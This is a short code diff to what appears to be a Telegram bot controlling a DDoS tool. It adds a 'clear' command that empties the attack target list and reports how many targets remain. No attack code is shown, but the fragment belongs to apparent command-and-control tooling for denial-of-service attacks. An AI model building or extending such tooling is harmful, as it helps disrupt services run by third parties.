@@ -37,6 +37,10 @@ bot.hears(["active", "/active"], async (ctx) => {
   );
   ctx.reply(commands.join("\n"));
 });
+bot.hears(["clear", "/clear"], (ctx) => {
+  ddos.clearTargets();
+  ctx.reply(`Targets ${ddos.targets.length}`);
+});
 
 bot.on("text", (ctx) => {
   if (!ctx.session) ctx.session = { targets: TARGETS };
